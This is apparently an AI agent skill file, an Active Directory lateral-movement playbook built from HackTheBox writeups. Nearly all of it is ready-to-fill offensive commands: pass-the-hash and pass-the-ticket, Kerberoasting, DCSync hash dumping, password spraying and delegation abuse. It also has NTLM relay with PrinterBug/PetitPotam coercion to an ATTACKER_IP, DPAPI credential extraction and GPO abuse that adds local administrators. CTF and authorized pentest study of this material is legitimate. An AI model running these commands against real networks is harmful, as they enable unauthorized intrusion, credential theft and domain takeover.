---
name: lateral-movement
description: Post-exploitation and lateral movement based on 0xdf writeups of Rebound, Forest, Administrator, Vintage, Mist, DarkCorp, Cicada, EscapeTwo.
---

# Lateral Movement

## Shell access
```bash
# WinRM (most common in HTB)
netexec winrm {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}       # PTH

# PSExec
impacket-psexec {DOMAIN}/{USER}:'{PASS}'@{IP}
impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}

# WMIExec (stealthier, no service creation)
impacket-wmiexec {DOMAIN}/{USER}:'{PASS}'@{IP}
```

## Pass-the-Hash
```bash
evil-winrm -i {IP} -u {USER} -H {NT_HASH}
netexec smb {IP} -u {USER} -H {NT_HASH}
netexec winrm {IP} -u {USER} -H {NT_HASH}
impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
```

## Pass-the-Ticket
```bash
export KRB5CCNAME={ticket.ccache}
impacket-psexec {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
evil-winrm -i {DC_FQDN} -r {DOMAIN}
netexec smb {DC_FQDN} -u {USER} -k --use-kcache
```

## Overpass-the-Hash (NTLM → TGT)
```bash
impacket-getTGT {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME={USER}.ccache
```

## Kerberoasting
```bash
impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# If rockyou fails → NOT the intended path, pivot
```

## AS-REP Roasting
```bash
impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## DCSync
```bash
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
impacket-secretsdump {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc-user administrator
```

## Password spray
```bash
# CAREFUL with lockout policy — check first with rpcclient querydominfo
netexec smb {IP} -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]'
netexec smb {IP} -u users.txt -p '{PASSWORD}' --continue-on-success | grep -F '[+]'
# Common HTB passwords: username, Welcome1!, Password1!, Season+Year
```

## Constrained delegation (Rebound pattern)
```bash
# S4U2Self + S4U2Proxy to impersonate admin on allowed target
impacket-getST -spn {SPN} -impersonate administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASS}'
export KRB5CCNAME=administrator@{SPN}.ccache
impacket-psexec {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## RBCD — Resource-Based Constrained Delegation
```bash
# Requires GenericWrite over target computer
# Get target computer SID
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object '{TARGET}$' | grep objectSid
# Set msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_COMPUTER_SID}'
# Get service ticket
impacket-getST -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/{ATTACKER_COMPUTER}$ -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
impacket-psexec {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## NTLMRelay attacks (Mist/DarkCorp pattern)
```bash
# Setup responder/ntlmrelayx
impacket-ntlmrelayx -t ldaps://{DC_IP} --delegate-access --no-smb-server -smb2support
python3 Responder.py -I eth0 -wd

# Or relay to specific target
impacket-ntlmrelayx -t smb://{TARGET_IP} -smb2support
# Then coerce authentication via PrinterBug, PetitPotam, etc.
```

## Coercion attacks (PrinterBug / PetitPotam)
```bash
# PrinterBug — coerce DC to authenticate to attacker
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}

# PetitPotam — no creds needed
python3 PetitPotam.py {ATTACKER_IP} {DC_IP}
# Use with relay for ESC8 or shadow credentials
```

## Cross-session relay (Rebound/Mirage pattern)
```bash
# When another user is logged in on same box
# Check active sessions
netexec smb {IP} -u '{USER}' -p '{PASS}' --sessions
qwinsta /server:{TARGET}
# Then run RemotePotato0 or KrbRelay from Windows shell
.\RemotePotato0.exe -m 2 -s 1 -x {ATTACKER_IP} -p 9998
```

## DPAPI credential extraction
```bash
# On compromised Windows machine:
Get-ChildItem -Path C:\Users\{USER}\AppData\Roaming\Microsoft\Credentials\ -Force
Get-ChildItem -Path C:\Users\{USER}\AppData\Local\Microsoft\Credentials\ -Force

# From Linux (donpapi)
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'

# From Linux (impacket)
impacket-dpapi masterkey -file {MASTERKEY} -sid {SID} -password {PASS}
impacket-dpapi credential -file {CRED_FILE} -key {MASTERKEY}
```

## AD Recycle Bin (TombWatcher pattern)
```bash
# Check if user is in "AD Recycle Bin" group (BloodHound)
# PowerShell (from Windows shell):
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
# Recover object:
Restore-ADObject -Identity {OBJECT_GUID}
```

## GPO abuse (DarkCorp pattern)
```bash
# Check GPO write rights in BloodHound
# SharpGPOAbuse (from Windows shell)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USER} --GPOName '{GPO_NAME}'
# Or pygpoabuse (from Linux)
python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASS}'@{DC_IP} -gpo-id {GPO_ID} -command 'net localgroup administrators {USER} /add'
```

## Pivot checklist after each new account
```
1. netexec winrm → shell?
2. netexec smb --shares → new shares?
3. BloodHound → mark owned, check outbound control
4. certipy find → ADCS paths?
5. Check group memberships (Backup Operators, Account Operators, Remote Management Users)
6. Check sessions on machine (qwinsta, netexec --sessions)
7. Check for stored credentials (DPAPI, browser, scheduled tasks)
```